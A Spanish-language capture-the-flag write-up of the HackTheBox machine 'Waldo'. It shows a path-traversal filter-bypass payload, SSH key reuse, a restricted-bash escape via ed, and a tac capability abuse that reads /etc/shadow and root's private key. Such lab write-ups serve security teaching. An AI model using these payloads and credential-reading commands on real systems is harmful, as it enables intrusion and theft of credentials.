---
layout      : post
title       : "HackTheBox - Waldo"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png
category    : [ htb ]
tags        : [ LFI, ssh-keys, capabilities, restricted-bash, tac ]
---
Máquina linux nivel medio. Los lindos **LFI**, jugueteo con **SSH**, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las **CAPA**cidades **BILITIES**as.

![149waldoHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149waldoHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [strawman](https://www.hackthebox.eu/profile/1895) & [capnspacehook](https://www.hackthebox.eu/profile/35484).

Juguetona juguetonaaaa.

Inicialmente nos encontraremos un servidor web que nos permite crear listas de ítems, jugando con `BurpSuite` veremos que dos peticiones están interactuando directamente con archivos del sistema, jugaremos con eso para conseguir `LFI (Local File Inclusion)` y leer archivos del sistema. Llegaremos a encontrar una llave privada con el nombre de archivo `.monitor` y algunos usuarios, entre ellos a `nobody`, testeando la llave privada contra ese usuario lograremos obtener una Shell en un contenedor por medio de `SSH`.

Dentro veremos que existen dos servicios `SSH` corriendo, uno en el puerto `22` y otro en el puerto `8888` (en este nos conectamos nosotros), con esto en mente y explorando el directorio `.ssh` llegaremos a otro usuario, uno llamado `monitor`, jugando de nuevo con la llave privada (que se llama como ese usuario 🤪) y el **SSH local** obtendremos una sesión como él en la máquina host.

Llegaremos y estaremos restringidos con una `rbash (restricted bash)`, enumerando sabremos que solo podemos ejecutar `4` comandos, entre ellos `ed` pero restringido (`red` de **r**estricted ed). Apoyados en la web veremos que podemos ejecutar comandos estando dentro del editor `ed`, generaremos una `/bin/bash` para escapar de la **bash restringida**.

Finalmente viendo que `capabilities` existen en el sistema encontraremos `cap_dac_read search` asignada a dos binarios, uno de ellos es `tac` (`cat` pero al revés, literal). La capability nos permite bypassear los permisos de lectura que tenga cualquier archivo, por lo que podremos leer objetos del sistema sin restricción.

A pesar de encontrar una `id_rsa` en el directorio `/root` no lograremos una sesión como él, esto gracias a la configuración `SSH` que no permite que el usuario `root` obtenga una Shell por ese medio :(

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Con vulns conocidas (más o menos) pero algo juguetona, aunque escala a la realidad.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Es momento de beber agua.

1. [Reconocimiento](#reconocimiento).
  * [Encontramos puertos abiertos con ayuda de nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Recorremos el servidor web sobre el puerto 80](#puerto-80).
3. [Explotación](#explotacion).
  * [Encontramos **LFI** en el servidor web](#lfi).
4. [Movimiento lateral (movimientos sensuales con **SSH**) nobody -> monitor](#ssh-8888-22).
  * [Bypasseamos la **Shell restringida** en la que estamos](#rbash-bypass).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Vamos a empezar enumerando los puertos activos de la máquina, así vamos viendo por donde encaminarnos:

```bash
❱ nmap -p- --open -v 10.10.10.87 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Este escaneo nos devuelve:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Thu Aug  5 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.87
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.87 ()	Status: Up
Host: 10.10.10.87 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Thu Aug  5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 98.88 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Posibilidad de una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web. |

Listos, ahora vamos a enfocarnos en escanear las versiones y scripts que estén relacionados con cada servicio:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**

```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.87
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.10.87 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y con este escaneo vemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Thu Aug  5 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.87
Nmap scan report for 10.10.10.87
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug  5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.86 seconds
```

Perefeeeesto, ¿qué podemos destacar?

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.5 (protocol 2.0) |
| 80     | HTTP     | nginx 1.12.2 |

Vemos un archivo llamado `list.html`, pero poco podemos hacer o entender sobre él, así que empecemos a explorar y ver por donde explotar la máquina.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una locura de colores y sabores 😁 vemos inicialmente un botón para añadir lista, si damos clic sobre él obtendríamos algo así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80_addList.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Se nos genera un ítem con el cual podemos interactuar de dos maneras: `Delete` o inspeccionando su contenido (dando clic en `list1`):

* Con `Delete` simplemente lo borramos.
* Con `list1` (al dar clic) se nos dan dos opciones más, `Add` (añadimos un ítem a la lista) y `Back` para regresar a la lista de listas e.e

Muy lindo ¿pero y queeeeeeeee? Si enumeramos un poquitico más a fondo y leemos el código fuente de la web vemos el llamado a un archivo `.js`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80_sourceCode_listHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si nos movemos ahora a ese recurso vemos tooooodas las definiciones interactivas de la web al jugar con las listas y los ítems, el archivo es gigante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80_sourceCode_listJS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, si leemos algunas líneas ya vemos cositas interesantes: 

* Peticiones `POST`.
* Referencia a archivos:
  * `fileWrite.php`
  * `fileDelete.php`
  * `dirRead.php`
  * `fileRead.php`

Todos con nombres interesantes. Pues abramos `BurpSuite` e interceptemos esas peticiones **POST**, jugamos con el `repeater` y vamos acumulando cada petición, finalmente tenemos:

...

# Explotación [#](#explotacion) {#explotacion}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_tabs_requests.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si nos fijamos de los 4 recursos, hay dos muuuy llamativos, `fileRead.php` y `dirRead.php`, inspeccionemos **fileRead.php**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_fileRead_res.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ufff uff ufffff, esa variable `file` se ve juguetona:

```html
file=./.list/list1
```

Al parecer indica que de la ruta actual entre al directorio `.list` y de él muestre el archivo `list1`.

---

## Encontramos **LFI** en el servidor web [📌](#lfi) {#lfi}

Pues lo primero que se nos viene a la cabeza es intentar un **LFI (Inclusion Local de Archivos)** para ver si de alguna manera logramos enumerar objetos del sistema a los que normalmente no deberíamos tener acceso...

* [¿Cómo funciona una vulnerabilidad Local File Inclusion?](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/).

Si recordamos en nuestro escaneo de **nmap** habíamos visto el archivo `list.html` (que sería el home), intentemos encontrarlo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_fileRead_findLISThtml_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_fileRead_findLISThtml_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pero claro que siiiiiiiiiiiii, encontramos un **LFI**, peeeeeerfectoooo. Usémoslo para encontrar los `.php` y ver su contenido:

```html
file=./fileRead.php
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_fileRead.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tomemos su contenido y guardémoslo en un archivo de nuestra máquina, hagamos que los saltos de línea que están como texto (`\n`) se conviertan en verdaderos saltos de línea y lo mismo con las tabulaciones (`\t`):

```bash
❱ sed -i 's/\\n/\n/g' fileRead.php
❱ sed -i 's/\\t/\t/g' fileRead.php
# Este para quitar algunos escapes (\) que hay:
❱ sed -i 's/\\//g' fileRead.php
```

Obtendríamos ahora si el archivo bien lindo:

```php
<?php

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $fileContent['file'] = false;
    header('Content-Type: application/json');
    if(isset($_POST['file'])){
        header('Content-Type: application/json');
        $_POST['file'] = str_replace( array("../", ".."), "", $_POST['file']);
        if(strpos($_POST['file'], "user.txt") === false){
            $file = fopen("/var/www/html/" . $_POST['file'], "r");
            $fileContent['file'] = fread($file,filesize($_POST['file']));  
            fclose();
        }
    }
    echo json_encode($fileContent);
}
```

Si nos fijamos, hay dos validaciones interesantes:

* `$_POST['file'] = str_replace( array("../", ".."), "", $_POST['file']);`
  * Lo que hace es tomar el valor de la variable `file` y si en su contenido existen/encuentra ya sea `../` o `..` los remplaza por: `` (vacío).

  Por lo que si enviamos:

  ```html
  file=../../../etc/passwd
  ```

  Se convertirá en:

  ```html
  file=etc/passwd
  ```

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_scriptPHP_example_strReplace.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

  Y abre el archivo dentro de la ruta `/var/www/html` simplemente con:

  ```html
  $file = fopen("/var/www/html/" . $_POST['file'], "r");
  $fileContent['file'] = fread($file,filesize($_POST['file']));  
  fclose();
  ...
  echo json_encode($fileContent);
  ```

Sabemos que hay un filtro para evitar movernos entre rutas, ¿pero y si intentamos romperlo? Haciendo distintas pruebas llegamos finalmente a esta:

* [LFI - Filter bypass tricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#filter-bypass-tricks).

---

```php
file=....//....//....//etc/passwd
```

Que se convertirá en:

```php
file=///etc/passwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_etcPasswd.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> No entiendo muy bien el porque esa cadena nos da la explotación ya que relativamente no es una ruta valida (por los `//` iniciales), si sabes el porqué, chárlame, quizás estoy obviando algo :)

Maravelooooso, tenemos acceso ahora a los archivos del sistema. Si le damos el formato correcto al objeto `passwd` tendríamos:

```bash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```

Como usuarios interesantes tenemos: `root`, `operator` y `nobody`.

Jugando con algunos archivos por default no encontramos nada más :( acá recaemos en el objeto `dirRead.php`:

```html
file=./dirRead.php
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_fileRead2dirRead.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hacemos de nuevo el formateo y obtenemos:

```php
<?php

if($_SERVER['REQUEST_METHOD'] === "POST"){
    if(isset($_POST['path'])){
        header('Content-type: application/json');
        $_POST['path'] = str_replace( array("../", ".."), "", $_POST['path']);
        echo json_encode(scandir("/var/www/html/" . $_POST['path']));
    }else{
        header('Content-type: application/json');
        echo '[false]';
    }
}
```

En este objeto simplemente toma la variable `path`, vuelve a validar que no tengan `..` o `../` y hace un `scandir` (como un `ls`) sobre esa ruta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

O podemos ver tooodos los objetos que usa la web simplemente borrando el directorio `.list` de la variable:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_list.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ese sería su uso normal, ¿pero y si volvemos a tomar nuestro "payload" con el que vimos archivos del sistema y lo usamos para listar directorios? 👀

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_list_withpayload.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

😄 ***¿Esa petición es real o solo cambié el valor de la variable `path` para hacerles creer que funciona?***

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_rootsystem.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues era reaaaaaal, tenemos ahora acceso a listar directorios del sistemaaaaaaaaaaaa (a los que tengamos acceso, claramente 🤭)

Después de movernos entre rutas encontramos este conjunto de directorios:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_home_nobody.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un directorio `.ssh`, podemos inspeccionarlo a ver si hay llaves de acceso que le permitan a algún usuario ingresar al sistema sin necesidad de colocar contraseñas, esto simplemente conectándose con una llave: 

* [Concepto **SSH Keys**](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_home_nobody_ssh.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un objeto llamado `.monitor` que si intentamos usarlo como directorio nos devuelve un `false`, por lo que no es un directorio, peeeeeeeeeeero, tenemos por otro lado el archivo para leer objetos del sistema, usémoslo para ver su contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_fileRead_ssh_monitor.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAAAAAAA una llave **SSH** privada, pues pasémosla a nuestro sistema, démosle el formato lindo e intentemos usarla contra el sistema víctima, quizás es funcional para algún usuario actual.

Debemos darle los permisos necesarios, así evitamos problemas:

```bash
❱ chmod 600 monitor_idRSA
```

Jugando con los usuarios que encontramos antes, si intentamos la conexión como `nobody` logramos obtener una sesión en el sistema:

```bash
❱ ssh nobody@10.10.10.87 -i monitor_idRSA
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_ssh_nobodySH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfectisiiiiimo, tamos dentrooooo (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149google_gif_go_on.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

...

# Movimiento lateral (jueguitos con SSH): nobody -> monitor [#](#ssh-8888-22) {#ssh-8888-22}

Estamos en un contenedor y hay poquitas cosas que hacer y sobre todo que enumerar...

Si revisamos los servicios activos tanto locales como en uso vemos el puerto `8888` y el puerto `9000`:

```bash
waldo:~/.ssh$ netstat -lant Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN
tcp        0      0 10.10.10.87:8888        10.10.14.6:49726        ESTABLISHED 
tcp        0      0 :::80                   :::*                    LISTEN
tcp        0      0 :::22                   :::*                    LISTEN
tcp        0      0 :::8888                 :::*                    LISTEN
```

Vemos que nuestra conexión con la máquina se estableció sobre el puerto `8888`, lo cual es extraño porque nosotros ingresamos usando `SSH` por lo que debería ser el puerto `22` el que tendría que estar establecido, si nos vamos rápidamente a la configuración `SSH` del sistema vemos esto:

```bash
waldo:~/.ssh$ cat /etc/ssh/sshd_config          
...
Port 8888
...
```

El puerto `8888` es el que sirve el servicio **SSH**, ¿pero y entonces el puerto `22` que vimos arriba? Hay dos servicios `SSH` lo cual esta muy loco :o

Si recordamos nosotros entramos a la máquina por medio de una llave **SSH** de esta ruta:

```bash
waldo:~/.ssh$ pwd
/home/nobody/.ssh
waldo:~/.ssh$ ls -la
total 20
drwx------    1 nobody   nobody        4096 Jul 15  2018 .
drwxr-xr-x    1 nobody   nobody        4096 Jul 24  2018 ..
-rw-------    1 nobody   nobody        1675 May  3  2018 .monitor
-rw-------    1 nobody   nobody         394 May  3  2018 authorized_keys
-rw-r--r--    1 nobody   nobody         344 Aug  6 18:53 known_hosts
```

Si revisamos el archivo `authorized_keys` notamos algo distinto:

```bash
waldo:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
```

¿Un usuario llamado `monitor` del sistema en el que estamos? Pero si habíamos visto que solo existían los usuarios `root`, `operator` y `nobody`.

Puuuuues como prueba podemos jugar con la llave privada de `nobody` (que el archivo se llama `.monitor` u.u) pero ahora contra el usuario `monitor`, solo que apuntamos al servicio `SSH` corriendo en el puerto `22` localmente, aaaa ver:

```bash
waldo:~/.ssh$ ssh monitor@localhost -i .monitor
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_ssh_monitorSH1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_ssh_monitorSH2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Varias cositas interesantes:

1. ESTAMOS DEEEEEEEEEEEEEEEEEENTROOOO como **monitor**.
2. La máquina se pone juguetona con la bienvenida que nos da.
3. Estamos en alguna Shell restringida, por lo que no podemos hacer muchas cositas :(

Bien, bien, mal. No podemos hacer casi nada, ni `cd`, ni `cat`, nada de nada.

---

## Bypasseamos la <u>Shell restringida</u> [📌](#rbash-bypass) {#rbash-bypass}

---

```bash
monitor@waldo:~$ cd ..
-rbash: cd: restricted
```

Si revisamos el `$PATH` (para saber en qué rutas busca el sistema los programas que pasamos como comandos) vemos:

```bash
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```

Y si revisamos por ejemplo la primera ruta, tendríamos los binarios que podemos ejecutar:

```bash
monitor@waldo:~$ ls -la /home/monitor/bin
total 8
dr-xr-x--- 2 root monitor 4096 May  3  2018 .
drwxr-x--- 5 root monitor 4096 Jul 24  2018 ..
lrwxrwxrwx 1 root root       7 May  3  2018 ls -> /bin/ls
lrwxrwxrwx 1 root root      13 May  3  2018 most -> /usr/bin/most
lrwxrwxrwx 1 root root       7 May  3  2018 red -> /bin/ed
lrwxrwxrwx 1 root root       9 May  3  2018 rnano -> /bin/nano
```

Solo `4` comandos... Ejecutando `echo $SHELL` sabemos que estamos un una `rshell` o sea una `restricted shell`. Buscando en internet maneras de bypassear esto ninguna opción nos funciona, pero nos da ideas para intentar contra los binarios que tenemos:

* [Técnicas para escapar de shells restringidas (restricted shells bypassing)](https://www.hackplayers.com/2018/05/tecnicas-para-escapar-de-restricted--shells.html).

Después de un rato encontramos [este post](https://www.geeksforgeeks.org/ed-command-in-linux-with-examples/) que nos habla sobre el comando `ed` (que restringido seria `red`) que sirve como editor de texto. Pero ese post nos muestra su funcionamiento, validemos si hay alguna manera de ejecutar comandos con él...

* [ed - Unix, Linux Command](https://www.tutorialspoint.com/unix_commands/ed.htm).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149google_ed_exeCommand.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opaaaa, podemos usar `!commando` para que sea interpretada con una `sh`. Pues intentemos simplemente spawnearnos una `/bin/bash` a ver si logramos salir de la `rbash`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_nobodySH_ed_bypassRSHELL_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OJITOOOOOOOOOOOOO podemos movernooooooooos entre directorios, pero claro aún no podemos ejecutar `id` porque el sistema no encuentra un binario en toooodas las rutas del `PATH` que este asociado a ese comando, pero eso es sencillo, solo debemos modificar el valor de la variable `PATH` por las rutas donde `linux` tiene todooos los binarios:

* [Si no tienes ni idea de eso dizque el "PATH"](https://opensource.com/article/17/6/set-path-linux).

(Podemos hacer en nuestra máquina `echo $PATH` y copiar las del sistema (las que no tienen nuestro usuario) o buscar en internet las rutas)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_monitorSH_updatingPATHvariable.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perrrrrrfecto, ahora si tenemos acceso a los comandos del sistema, si ga mos...

🏇 ***Después de que algunos binarios no los encontraba, finalmente nuestro `PATH` queda así:***

```bash
monitor@waldo:~$ echo $PATH
/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/bin:/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando las **capabilities** del sistema (que serian como pequeñas instrucciones **privilegiadas** otorgadas a X proceso(s)) encontramos:

```bash
monitor@waldo:~$ getcap -r / 2>/dev/null
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

Actualmente contamos con dos archivos usando la capability [CAP_DAC_READ_SEARCH](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_dac_read_search), la cual permite **bypassear los permisos de lectura que existan en los archivos** 😮 kooooooooomoooo? 😈

*Más info sobre `capabilities`*:

* [Understanding Linux Capabilities Series (Part I)](https://blog.pentesteracademy.com/linux-security-understanding-linux-capabilities-series-part-i-4034cf8a7f09).
* [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work).

Uno de los dos se relaciona con el usuario `monitor`, pero inicialmente me llamo la atención la de `tac`, [buscando que hace ese comando](https://www.howtoforge.com/linux-tac-command/) en `Linux`, es prácticamente un `ca, pero que imprime el resultado al revés, básicamente:

```bash
monitor@waldo:/tmp$ cat hola.txt 
hola
si
nop
monitor@waldo:/tmp$ tac hola.txt 
nop
si
hola
```

Pero recordemos que el binario `tac` tiene la capability que le permite saltarse los permisos de lectura de cualquier archivo, por lo que podemos hacer una prueba sencilla con el archivo `/etc/shadow`, a él simplemente tiene acceso `root` (o algún usuario privilegiado), por lo que si intentáramos abrirlo con `cat` deberíamos obtener un `permission denied`:

```bash
monitor@waldo:/tmp$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

Efectivamente, no tenemos permisos para ver su contenido... ¿Peeeeroooo y con `tac`?

```bash
monitor@waldo:/tmp$ tac /etc/shadow
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_monitorSH_tac_etcShadow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO podemos leer archivos privilegiaaaados del sistemaaaaaaaaaaaaaaaa.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149google_gif_comedymanoverhype.gif" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo único es que se nos imprime al revés, pero con la misma herramienta podemos usar el parámetro `-s ,` (**s**eparado por **,**) y el programa nos lo muestra en el orden normal (***pero claro, nos aprovechamos de un feature, en todo caso si existiera algún problema podemos tomar el contenido, guardarlo en un archivo y volver a ejecutar `tac`, en ese caso lo mostraría ahora si con el orden correcto***)

```bash
monitor@waldo:/tmp$ cat hola.txt 
hola
si
nop
monitor@waldo:/tmp$ tac hola.txt -s ,
hola
si
nop
```

Bien, pues si podemos leer el archivo `shadow` podemos buscar si existe alguna llave privada para el usuario `root`:

```bash
monitor@waldo:/tmp$ tac /root/.ssh/id_rsa -s ,
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_monitorSH_tac_rootIdRSA.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

(EL TOOOOOOOOOOOOC de eso vacío e.e)

OPAAAAAAAAAAAAAAAAAA, exiiiiiste, pues copiémosla, generemos un archivo con ella e intentemos conectarnos como el usuario `root` al servicio `SSH`.

Después de varios intentos no logramos obtener una **Shell**, averiguando con mis contactos clandestinos (`s4dbrd` 💖) parece ser algo con lo que el creador quiso jugar (:(

E indagando en el sistema encontramos la razón:

```bash
monitor@waldo:/tmp$ cat /etc/ssh/sshd_config
...
PermitRootLogin no
...
```

Podríamos jugar con cracking contra el archivo `shadow`, pero de lo que probé se demoró demasiado, así que F.

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149user_flag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149root_flag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Bonita máquina, medio loca, me gusto el **LFI**, bastante interesante.

